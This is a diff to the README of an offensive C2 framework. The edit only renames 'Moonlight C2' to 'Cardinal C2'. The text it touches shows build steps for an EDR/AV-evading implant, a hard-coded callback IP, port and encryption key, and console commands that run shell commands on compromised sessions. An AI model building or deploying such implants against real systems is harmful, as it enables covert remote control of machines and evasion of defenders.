@@ -1,4 +1,4 @@
-# Moonlight C2 Framework
+# Cardinal C2 Framework
 
 <div align="center">
 
@@ -27,7 +27,7 @@
 
 This framework is designed for legitimate penetration testing, security research, and authorized red team operations. Unauthorized access to computer systems is illegal. The authors assume no liability and are not responsible for any misuse or damage caused by this software.
 
-By using Moonlight C2, you agree to:
+By using Cardinal C2, you agree to:
 - Only test systems you own or have explicit written permission to test
 - Comply with all applicable laws and regulations
 - Use responsibly for defensive security purposes
@@ -36,7 +36,7 @@ By using Moonlight C2, you agree to:
 
 ## 📋 Overview
 
-Moonlight C2 Framework is a comprehensive Command & Control system specifically designed for penetration testing legacy Windows environments. It provides a modern, Cobalt Strike-inspired interface while maintaining compatibility with older Windows systems.
+Cardinal C2 Framework is a comprehensive Command & Control system specifically designed for penetration testing legacy Windows environments. It provides a modern, Cobalt Strike-inspired interface while maintaining compatibility with older Windows systems.
 
 **Version 2.0** introduces advanced **x86 Assembly** enhancements for superior stealth, performance, and EDR/AV bypass capabilities, plus comprehensive **target monitoring and control** system.
 
@@ -68,7 +68,7 @@ Moonlight C2 Framework is a comprehensive Command & Control system specifically 
 ## 🏗️ Architecture
 
 ```
-Moonlight C2 Framework v2.0 (Assembly Enhanced)
+Cardinal C2 Framework v2.0 (Assembly Enhanced)
 │
 ├── Server (C + Assembly)      # C2 server backend
 │   ├── Session management (up to 100 clients)
@@ -196,12 +196,12 @@ All compiled binaries will be in the `bin` directory.
 # Build enhanced client with assembly
 cd client
 make enhanced
-# Output: build/moonlight-implant-enhanced.exe
+# Output: build/Cardinal-implant-enhanced.exe
 
 # Build enhanced server with assembly
 cd server
 make enhanced
-# Output: build/moonlight-server-enhanced.exe
+# Output: build/Cardinal-server-enhanced.exe
 
 # Build exploits
 cd exploits
@@ -222,7 +222,7 @@ nasm -f win32 syscalls.asm -o build/obj/syscalls.obj
 nasm -f win32 network_asm.asm -o build/obj/network_asm.obj
 
 # Link with C code
-gcc -o build/moonlight-implant-enhanced.exe \
+gcc -o build/Cardinal-implant-enhanced.exe \
     build/obj/implant_enhanced.o \
     build/obj/stealth.obj \
     build/obj/syscalls.obj \
@@ -240,24 +240,24 @@ gcc -o build/moonlight-implant-enhanced.exe \
 
 ```powershell
 # Start enhanced server (default port 4444)
-.\bin\moonlight-server-enhanced.exe
+.\bin\Cardinal-server-enhanced.exe
 
 # Interactive console commands
-moonlight> list                    # List active sessions
-moonlight> send 0 shell whoami     # Execute command on session 0
-moonlight> kill 0                  # Terminate session 0
-moonlight> stats                   # Show server statistics
-moonlight> exit                    # Shutdown server
+Cardinal> list                    # List active sessions
+Cardinal> send 0 shell whoami     # Execute command on session 0
+Cardinal> kill 0                  # Terminate session 0
+Cardinal> stats                   # Show server statistics
+Cardinal> exit                    # Shutdown server
 ```
 
 #### Basic Server
 
 ```powershell
 # Start basic server
-.\bin\moonlight-server.exe
+.\bin\Cardinal-server.exe
 
 # Start on custom port
-.\bin\moonlight-server.exe 8080
+.\bin\Cardinal-server.exe 8080
 ```
 
 **Server Console Commands:**
@@ -283,7 +283,7 @@ The enhanced implant includes:
 
 ```powershell
 # Run enhanced implant (connects to C2_SERVER in code)
-.\bin\moonlight-implant-enhanced.exe
+.\bin\Cardinal-implant-enhanced.exe
 
 # Implant will:
 # 1. Perform anti-analysis checks
@@ -297,16 +297,16 @@ The enhanced implant includes:
 ```c
 #define C2_SERVER "192.168.1.100"  // Change to your server IP
 #define C2_PORT 4444
-#define ENCRYPTION_KEY "MoonlightC2SecretKey2025"
+#define ENCRYPTION_KEY "CardinalC2SecretKey2025"
 ```
 
 #### Basic Implant
 
 ```powershell
-.\bin\moonlight-implant.exe <server_ip> <port>
+.\bin\Cardinal-implant.exe <server_ip> <port>
 
 # Example
-.\bin\moonlight-implant.exe 192.168.1.10 4444
+.\bin\Cardinal-implant.exe 192.168.1.10 4444
 ```
 
 ### Supported Commands (Enhanced Implant)
@@ -365,7 +365,7 @@ The enhanced implant includes:
 
 ```powershell
 # Start the GUI application
-.\bin\MoonlightC2-GUI.exe
+.\bin\CardinalC2-GUI.exe
 ```
 
 **GUI Features:**
@@ -469,9 +469,9 @@ MoonLignt-C2-Framework/
 │   ├── main.c              # Main GUI implementation
 │   └── Makefile
 ├── bin/                     # Compiled binaries (generated)
-│   ├── moonlight-server-enhanced.exe
-│   ├── moonlight-implant-enhanced.exe
-│   ├── MoonlightC2-GUI.exe
+│   ├── Cardinal-server-enhanced.exe
+│   ├── Cardinal-implant-enhanced.exe
+│   ├── CardinalC2-GUI.exe
 │   └── exploits/
 ├── Build-All.ps1            # Master build script (NEW v2.0)
 ├── ASSEMBLY_GUIDE.md        # Assembly documentation (NEW v2.0)
@@ -698,12 +698,12 @@ This project is released under an Educational License. See [LICENSE](LICENSE) fi
 
 *"With great power comes great responsibility"*
 
-**Moonlight C2 Framework v2.0**  
+**Cardinal C2 Framework v2.0**  
 Made for Authorized Penetration Testing & Security Research
 
 ---
 
-**[Report Issues](https://github.com/yourusername/moonlight-c2/issues)** | 
+**[Report Issues](https://github.com/yourusername/Cardinal-c2/issues)** | 
 **[Build Guide](BUILD_GUIDE.md)** |
 **[Assembly Guide](ASSEMBLY_GUIDE.md)** | 
 **[Command Reference](COMMANDS.md)** |
